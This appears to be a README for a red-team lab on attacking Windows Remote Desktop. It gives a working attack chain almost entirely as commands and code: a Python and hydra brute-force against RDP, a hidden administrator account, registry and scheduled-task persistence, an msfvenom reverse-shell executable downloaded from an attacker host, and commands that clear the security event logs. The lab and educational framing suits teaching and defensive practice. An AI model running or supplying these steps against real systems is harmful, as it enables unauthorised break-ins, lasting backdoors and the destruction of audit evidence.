Advanced RDP Red Teaming Lab

Disclaimer

> This project is for educational purposes only. All activities were conducted in a safe, isolated lab environment using virtual machines I own. Do not attempt this on any system you do not have explicit permission to test.




---

Table of Contents

Objective

Lab Setup

Recon & Scanning

RDP Brute-Force

Python Script

Access & Post-Exploitation

Privilege Escalation

Persistence

Backdoor Shell

Lateral Movement

Clean-Up

Reporting



---

Objective

Simulate a real-world red team operation by brute-forcing weak RDP credentials, then performing post-exploitation, persistence, and potential lateral movement on the compromised host.


---

Lab Setup


---

Recon & Scanning

Scan RDP port with Nmap:

nmap -p 3389 <target_ip>


---

RDP Brute-Force

Use hydra:

hydra -t 8 -V -l Administrator -P shortlist.txt rdp://<target_ip>

Or use the Python script below.


---

Python Script

import subprocess
import time

# Replace with your target IP and wordlist
target_ip = "192.168.56.101"
username = "Administrator"
wordlist_path = "shortlist.txt"
success_log = "rdp_success.txt"

def attempt_login(password):
    password = password.strip()
    command = [
        "xfreerdp",
        f"/u:{username}",
        f"/p:{password}",
        f"/v:{target_ip}",
        "/cert:ignore"
    ]
    try:
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=10)
        if b"connected" in result.stdout.lower():
            print(f"[+] SUCCESS: {password}")
            with open(success_log, "a") as f:
                f.write(f"{username}:{password}\n")
            return True
        else:
            print(f"[-] Failed: {password}")
    except Exception as e:
        print(f"[!] Error: {str(e)}")
    return False

with open(wordlist_path, "r", encoding="latin-1") as f:
    for line in f:
        password = line.strip()
        if attempt_login(password):
            break
        time.sleep(1)

Run with:

python3 rdp_bruteforce.py


---

Access & Post-Exploitation

xfreerdp /u:Administrator /p:<password> /v:<target_ip> /cert:ignore

Inside RDP Session:

whoami
hostname
ipconfig /all
systeminfo
dir /s /b C:\\Users\\*.txt


---

Privilege Escalation

Check permissions:

whoami /groups

Run WinPEAS/SharpUp for local exploits (upload via RDP). Look for:

AlwaysInstallElevated

Unquoted service paths

Weak service permissions



---

Persistence

Add hidden admin user:

net user sysadmin P@ssw0rd123 /add
net localgroup administrators sysadmin /add

Registry-based persistence:

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d "C:\\rev.exe"

Scheduled Task:

schtasks /create /tn "Updater" /tr "C:\\rev.exe" /sc onlogon


---

Backdoor Shell

Generate backdoor:

msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=4444 -f exe -o rev.exe
python3 -m http.server 80

Download in RDP:

powershell -c "Invoke-WebRequest -Uri http://<kali_ip>/rev.exe -OutFile C:\\rev.exe"

Execute & catch:

nc -lvnp 4444


---

Lateral Movement

net view /domain
net view \\<hostname>

Reuse dumped credentials to access other machines if available.


---

Clean-Up

Clear logs (not recommended unless simulating attacker evasion):

wevtutil cl Security
wevtutil cl System

Delete backdoors, users, and payloads.


---

Reporting

Document:

Entry vector

Credentials cracked

Privilege escalation method

Persistence mechanism

Tools/scripts used

Detection logs

Mitigation recommendations



---

.gitignore

*.log
*.pcap
*.cap
*.pyc
__pycache__/
*.vbox
*.vbox-prev
*.vdi
*.ova
*.ovf
.DS_Store
.idea/
.env
output/


---

End of README

